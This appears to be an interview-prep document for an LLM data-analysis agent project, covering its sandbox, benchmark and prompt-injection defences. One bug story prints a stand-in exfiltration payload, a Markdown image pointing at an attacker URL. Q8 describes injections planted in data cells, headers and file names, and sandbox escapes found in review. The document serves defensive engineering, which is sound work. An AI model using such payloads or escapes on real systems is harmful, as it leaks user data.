# Resume bullets, pitch and interview prep

Talking points for presenting this project in an AI-engineer interview. Every factual claim
below comes from the code or from [README.md](../README.md), [CHANGELOG.md](../CHANGELOG.md),
[design-decisions.md](design-decisions.md), [review.md](review.md), [review-2.md](review-2.md),
[sandbox.md](sandbox.md), [integration-notes.md](integration-notes.md) and
[eval-runbook.md](eval-runbook.md), and carries a pointer you can open.

> **Nothing here has been measured with a live model.** v0.1.0 was built and checked offline
> (scripted LLM, fake API). The README *Results* table is empty. Metrics that need the paid run
> are written as `{{PLACEHOLDERS}}`; section 1 says which command fills each one. Do not invent a
> value, and do not send a bullet with an unfilled placeholder: delete that clause instead.

Offline numbers that *are* measured (README *Results* and CHANGELOG *Measured offline*): the full
test suite passes (run `make test` for the current number), 94.2% branch coverage (`sandbox/` 99.4%, `core/loop.py` 100%), the oracle agent at 100% on
the 64 gradable tasks, the escape fuzzer at 500 of 500 snippets blocked or killed, and 24 of 24
UI e2e checks.

---

## 1. Resume bullets (AI engineer)

Each bullet is two lines. Fill the placeholders from `runs/summary.md` after the paid run
(see the table below the bullets).

- Built an 80-task agent benchmark (seeded data, generator-computed ground truth, rubric-judged
  tier, offline CI gate); the Sonnet baseline scores **{{SONNET_ACC}}%** at **${{SONNET_COST_PER_TASK}}**/task.
- Confined LLM-written Python with seccomp-bpf and Landlock after a red-team review; the escape
  fuzzer blocks 500/500 snippets and the 16-task adversarial tier passes **{{ADV_PASS}}%**.
- Added a separate critic and Haiku/Sonnet routing as A/B flags: the critic corrects **{{CRITIC_CORRECTION}}%**
  of flagged answers, and routing runs at **{{ROUTING_COST_RATIO}}×** cost for **{{ROUTING_DELTA_PP}}** pp accuracy.

### Which command fills which placeholder

All commands are from [eval-runbook.md](eval-runbook.md) (steps 3 to 5). Run them from the repo
root with `ANTHROPIC_API_KEY` exported.

| Placeholder | Where it comes from | Command that produces it |
|---|---|---|
| `{{SONNET_ACC}}`, `{{SONNET_COST_PER_TASK}}`, `{{ADV_PASS}}` | `runs/summary.md` Overview, row *baseline / sonnet*: columns Accuracy, `$/task`, ADV | `scripts/run_experiments.sh --only baseline --batch --out runs/experiments/baseline`, then the summary command below |
| `{{CRITIC_CORRECTION}}` | *Critic* table, `sonnet (control)` row, column Correction (share of tasks the critic flagged that ended up passing) | `scripts/run_experiments.sh --only critic --batch --control "$CONTROL" --out runs/experiments/rest` |
| `{{ROUTING_COST_RATIO}}`, `{{ROUTING_DELTA_PP}}` | *Routing* table, `routing-on` row: columns Cost vs control and Δ acc | `scripts/run_experiments.sh --only routing --batch --control "$CONTROL" --out runs/experiments/rest` |

`CONTROL` is the Sonnet baseline run, `CONTROL=$(ls -d runs/experiments/baseline/sonnet/2*/ | tail -n 1)`.
The step-4 command in the runbook runs critic, semantic, routing and structured together; the
two rows above come out of that same run. Then build the one summary:

```bash
uv run python -m analyst_agent.eval.experiments summary runs/experiments/baseline/manifest.tsv runs/experiments/rest/manifest.tsv --out runs/summary.md
```

Rules before quoting a value (runbook, *Reading the results*):

- The row's *Notes* cell must be empty, or the row is not comparable.
- One L3 or ADV task is 6.25 pp, and one L1 or L2 task is 4.2 pp. A difference of one or two
  tasks is noise. Quote a range from a repeated run for any delta you put on a resume.
- `{{ADV_PASS}}` needs the judge: without `ANTHROPIC_API_KEY`, ADV is graded by rules only.
- Before quoting any L3 number, run `uv run python -m analyst_agent.eval judge-calibrate
  --judge-samples 3` (runbook step 1). The real judge has not been compared with the 24
  hand-labelled reports yet.

---

## 2. The 90-second pitch

About 220 words, which is 90 seconds at a normal pace.

> I built an agent that answers plain-English questions about a CSV, Parquet, SQLite or DuckDB
> file. It inspects the schema, writes SQL and Python, runs them in a sandbox, has a second model
> check the answer, and returns a Markdown report with charts. The loop is hand-written on the
> Anthropic Messages API, so I control every point where model output becomes an action.
>
> Three things make it more than a demo. First, the model's code is untrusted. A red-team review
> broke my Python-level guards twice, once with a shell and once with arbitrary file reads, so I
> added kernel enforcement, seccomp and Landlock, then wrote a grammar-based fuzzer that found
> eight more classes of gap. All are closed, and 500 of 500 fuzz snippets are now blocked.
>
> Second, quality is measured. There are 80 benchmark tasks over seeded data with generated
> ground truth, including an adversarial tier with prompt injections hidden in cells, headers and
> file names. CI makes no API calls, and every feature ships behind a flag, so each can be A/B'd
> on the same commit.
>
> Third, I'm honest about the gaps. No live-model run has happened yet. The paid experiments are
> scripted, budget-capped and costed, and the results table is empty until they run. I wrote
> down what I'd change for multi-tenant use, mainly per-job container isolation and a shared job
> store.

---

## 3. Ten likely interview questions

### Q1. How is the Python sandbox designed, and why those layers?

Each `run_python` call starts a fresh interpreter in its own session. The child sets its own
rlimits (no `preexec_fn`, review M7) and a scrubbed environment, then installs a **seccomp-bpf**
filter and a **Landlock** ruleset just before user code runs. A 60 s process-group kill and
`PR_SET_PDEATHSIG` bound its lifetime. The Python-level guards (audit hook, import allowlist,
socket patch) stay, but they are speed bumps: review H1 reached `/bin/sh` through
`_posixsubprocess.fork_exec` with no import and no audit event, and H2 read and wrote arbitrary
files through pyarrow's C++ I/O. Only the kernel layers are the boundary. SQL is separate:
single-statement `SELECT`/`WITH`/`EXPLAIN` allowlist confirmed by DuckDB's parser, a read-only
database, external access off with the configuration locked, a 30 s timeout and a 200-row cap.
([sandbox.md](sandbox.md), [review.md](review.md) H1/H2)

### Q2. What does the sandbox *not* protect against, and why not a container per call?

The child runs as the same Unix user. seccomp is a deny list, so unlisted syscalls below 463 are
allowed. `stat` works on any path, and nothing caps the number of files in the work dir. Landlock
is best effort: kernels before 5.13 and some gVisor setups lack it; the run continues, and the
parent process logs one `sandbox confinement degraded` warning so the operator sees it. A container or gVisor per call is the right boundary for
hostile multi-tenant use, but it needs a container runtime inside the service, a cold start on
every call, and a deployment model Cloud Run does not offer. Kernel self-confinement closed the
two real holes (no exec, no arbitrary file I/O) for 1.4 to 2.2 ms per call. The honest answer is
that the current design suits a trusted-operator, single-tenant service. ([sandbox.md](sandbox.md)
*Known gaps*, *What is NOT protected against*; [sandbox-performance.md](sandbox-performance.md))

### Q3. Why a separate critic instead of asking the model to double-check itself?

The critic is its own call with its own prompt. It sees only the draft, the SQL or code that
ran, and the result tables, not the planner's reasoning (`core/critic.py`). A model that rereads
its own chain of thought tends to ratify it, while a clean context catches wrong joins, double
counting and unsupported claims more often. That is the design argument. Whether it is true here
is an experiment I have scripted but not run: critic on versus `AGENT_MAX_CRITIC_ROUNDS=0` on all
80 tasks, reporting accuracy delta, cost, and the share of flagged tasks that end up passing.
([design-decisions.md](design-decisions.md) decision 2; [eval-runbook.md](eval-runbook.md))

### Q4. What are the critic's failure modes?

- **Correlated blind spots:** it shares a model family with the planner.
- **Cost:** one extra call per round, up to `AGENT_MAX_CRITIC_ROUNDS` (default 2).
- **It fails open:** unparseable output counts as `pass` and the run ends
  `completed_with_issues`, so a flaky critic cannot wedge a run (`parse_verdict`, review L11).
- **The deterministic check never vetoes.** With structured reports on, `check_consistency()`
  flags headline numbers that are not key numbers and key numbers no tool output contains. It
  only informs the critic, because formatting (`$1.2M` against `1234567.89`) makes false
  positives unavoidable.
- **Not yet measured:** how often the critic flips a correct answer.

### Q5. How is the eval built, and why can you trust the ground truth?

There are 80 tasks (24 L1, 24 L2, 16 L3, 16 ADV) over seeded synthetic data. The generator
computes each expected value from the CSVs as written to disk, and a test regenerates everything
byte for byte. Each L3 task investigates a planted pattern, and a guard aborts generation if the
pattern stops holding. Each task runs in a forkserver child in its own process group, and a
timeout kills the group, because `asyncio.wait_for` on a thread only stops *waiting*. L1, L2 and
the rule-checked part of ADV are graded without a model. L3 is graded by judge 2.0.0, which must
quote the report sentence behind each rubric point and gets credit for a figure only if it is
also in `key_numbers`. CI makes no API calls: the oracle agent must score 100%, and a dry run of
the real loop and sandbox runs with a scripted LLM, then again with every flag on.
([benchmark.md](benchmark.md), `eval/isolation.py`)

### Q6. Can you trust the numbers you do have? What is not measured?

The measured numbers are all offline, and I say so. The oracle's 100% checks the harness, not
the agent, and it covers 64 of 80 tasks because L3 needs a judge. BM25 retrieval scores 1.000
top-1 on the 33 benchmark cases, but the vocabulary was tuned with those cases in view: on the 10
held-out paraphrases it is 0.600 top-1, 0.900 top-3 and 0.758 MRR. The judge's agreement with
humans is checked only with an oracle fake (κ 1.000 tests the plumbing); the real figure is
unmeasured. With 16 L3 and 16 ADV tasks, one task is 6.25 pp, so single runs are noise and I
would report ranges from repeated runs. Judge 2.0.0 and planner 1.2.0 both change L3 scores, so
no earlier run is comparable. ([README.md](../README.md) *Results*, [CHANGELOG.md](../CHANGELOG.md),
integration notes *Still open at v0.1.0*, items 1 to 6)

### Q7. What are the trade-offs of model routing?

A Haiku call at `low` effort labels the question L1, L2 or L3 from the question plus a schema
summary, and the tier picks the working model. The run escalates one tier after a second critic
`revise` or when the same tool errors twice in a row, and each escalation grants one extra turn
so `max_turns` cannot block the retry. Trade-offs:

- The router is one more call, and a confident misroute to a cheap tier may never trigger
  escalation. The critic is not routed.
- With the default config, routing changes nothing: `AGENT_MODEL_L1/L2/L3` default to
  `AGENT_MODEL`. The experiment sets L1 to Haiku and L2/L3 to Sonnet.
- I rejected "always try cheap first": it pays twice on every hard question.
- Human approval denials never escalate. That was a real bug (story 2).
- The result I want is cost ratio well below 1.00× with accuracy delta inside noise. I have not
  measured it. ([model-routing.md](model-routing.md))

### Q8. How do you defend against prompt injection?

Mitigation, then guarantees. Tool output reaches the model inside a `<tool_output … trust="untrusted">`
fence, and the system prompt says nothing inside it is an instruction. Delimiter look-alikes are
neutralised case- and whitespace-insensitively (`_DELIMITER_RE`, review M1), and the same rule
guards the router's schema summary, the critic's inputs and memory's `<prior_insights>` block. I
do not rely on the fence, because the model can still obey. The guarantees are controls that
hold if it does: a read-only database, no sockets in the sandbox, row caps, approval gates for
`run_python` and large queries (opt-in, `AGENT_APPROVAL_ENABLED`), and a UI that renders no images from untrusted Markdown. The
ADV tier (16 tasks) plants injections in cell text, a column header and a file name, plus PII,
write attempts and exfiltration URLs, and a task passes only if the rule checks, the judge and
the legitimate part of the answer all pass. Known gaps: the MCP server's `structuredContent`
carries raw rows outside the fence (review-2 L2), and the ADV set is small and English-only. I
have no ADV pass rate from a live model yet. ([design-decisions.md](design-decisions.md) decision 5)

### Q9. What would you change to run this at scale (many tenants, real warehouses)?

From the documented limits, in order of risk:

1. **Isolation:** one Firecracker or gVisor sandbox per job with `--network none`, a UID per job,
   and a read-only root. Keep today's layers inside it.
2. **State:** the job store and approval broker are per-process (review L14), so the deploy docs
   pin one uvicorn worker and `--max-instances 1`. Move to Postgres and a real queue, with
   durable approvals and checkpointed `AgentState` so a restart resumes instead of
   `mark_interrupted`.
3. **Tenancy:** the API has no auth; Cloud Run IAM is the only boundary (review L1). Add auth,
   per-tenant artifact directories (L2) and per-tenant memory (L9).
4. **Reliability:** a job-level wall-clock timeout (L15) and `Retry-After`-aware retries (L16).
5. **Data:** warehouse connectors behind the same `run_sql(query) -> SqlResult` contract, with
   byte estimates replacing `EXPLAIN` rows in the approval gate.

### Q10. What would you do with another month?

Measurement first, then hardening, then breadth (README roadmap, integration notes *Still open*):

1. Run the paid experiments ([eval-runbook.md](eval-runbook.md)): publish the Results table with
   repeated runs, and re-calibrate the cost estimate, which predates judge 2.0.0.
2. Run `judge-calibrate --judge-samples 3` and fix the judge before trusting L3.
3. Measure embedding and hybrid retrieval and sweep `AGENT_SEMANTIC_HYBRID_WEIGHT`; close the
   gap on held-out paraphrases (4 of 10 miss top-1).
4. Verify the sandbox on Cloud Run gen2 (Landlock and seccomp under gVisor), and turn the
   parent-side "confinement degraded" log line into a startup self-check.
5. Build a harder benchmark: messy real schemas, Parquet and SQLite inputs, multi-turn
   injections, and a held-out set kept out of the repo.

---

## 4. The five hardest integration bugs (STAR)

Twenty-one branches were built in parallel against a written contract and merged in six rounds
([integration-notes.md](integration-notes.md)). Each bug below passed on its own branch. Stories
1 to 3 surfaced while merging; stories 4 and 5 were found by the hostile review of the merged
tree. Each story is under 120 words, evidence line included.

### 1. The forkserver child that read yesterday's environment

**S:** Eval hardening (#10) ran each task in a forkserver child. The approval branch (#11)
added `test_eval_auto_approves_gated_steps_by_default`, which passed alone and failed in the suite.
**T:** Find why a test's `AGENT_*` setting was ignored.
**A:** A forkserver child inherits the environment of the fork server, started once by the first
task, and `get_settings()` was cached in its preload. I made `run_in_subprocess` snapshot
`os.environ` per task; the child applies it and calls `get_settings.cache_clear()`.
**R:** Later config changes reach every task.
*Evidence:* `eval/isolation.py:_apply_env`, `tests/eval/test_isolation.py`.

### 2. A human's "no" escalated to a pricier model

**S:** Routing (#9) escalates a tier after the same tool fails twice. Approval (#11) returns a
denial to the model as an error tool result.
**T:** Explain why denying two `run_sql` calls switched to a stronger model.
**A:** The two features shared one signal, `is_error`, so a human denial counted as model
failure. I made the loop skip records carrying `data["approval"]` when counting repeated errors,
and added a combined test.
**R:** Denials never escalate (stated in the README). The 64-case dry-run flag matrix came from this class of bug.
*Evidence:* `core/loop.py:_check_repeated_tool_errors`, `test_human_denials_do_not_escalate`.

### 3. A security fix reopened by a merge with no conflict

**S:** Review M2 made Markdown images inert in the UI, because a browser fetches
`![x](https://attacker/?d=…)` with no click. The UI rewrite (#14), written earlier, merged cleanly.
**T:** Re-audit every review fix on the merged tree.
**A:** #14 re-emitted `![alt](url)` for any non-artifact image, restoring the hole, and M2's test
still passed because it tested the old helper. I added `report_parts()`, which charts only this
job's own `/artifacts/` URLs, and applied it to every Markdown surface.
**R:** One test (`test_no_untrusted_images.py`) now covers all surfaces.

### 4. The sandbox child that outlived its killed task

**S:** Eval kills a timed-out task with `killpg`, and its docstring promised grandchildren die
with it. `run_python` starts its child with `start_new_session=True`.
**T:** Check the claim in the post-merge review.
**A:** A task whose `run_python` slept was killed at 6 s, and `bootstrap.py` kept running with its
timeout enforcer dead. The child now sets `PR_SET_PDEATHSIG(SIGKILL)` and exits if its parent pid
changed; failure is fail-closed.
**R:** `test_child_dies_with_its_parent` fails on the old code.
*Evidence:* review-2 M3, `sandbox/_child/sitecustomize.py`.

### 5. A budget cap that could not see the expensive tasks

**S:** `eval run --budget-usd` sums each result's cost before starting the next task. Process
isolation (#10) returns nothing when a task times out.
**T:** Probe the cap with a task that hangs after one paid call.
**A:** The timed-out task recorded $0, so the cap never tripped, and the default 300 s timeout
makes these the dearest tasks. I added a per-task `SpendMeter` that writes to a
`multiprocessing.Value` the parent still holds after the kill.
**R:** `test_budget_counts_the_spend_of_timed_out_tasks` fails on the old code.
*Evidence:* review-2 M2.

---

## 5. Claims you can and cannot make today

| Can say (verified offline) | Cannot say yet |
|---|---|
| The full test suite passes (run `make test` for the current number), 94.2% coverage, oracle 100% on 64 gradable tasks | Any accuracy for any model on the benchmark |
| Fuzzer: 500 of 500 blocked or killed; 88 of 500 got through before the fixes | That the critic improves accuracy, or by how much |
| 2 High and 8 Medium (review) plus 4 Medium (review 2) findings fixed, each with a regression test | That routing saves money, or at what accuracy cost |
| BM25 top-1 1.000 on 33 tuned cases, 0.600 on 10 held-out paraphrases | Embedding or hybrid retrieval quality |
| Cost *estimate* for all 8 arms: $142.58, capped at $213.87 | The real spend; the estimate predates judge 2.0.0 |
| Docker images build and pass the sandbox probes; UI e2e 24 of 24 | Anything about Cloud Run, or the embeddings image |
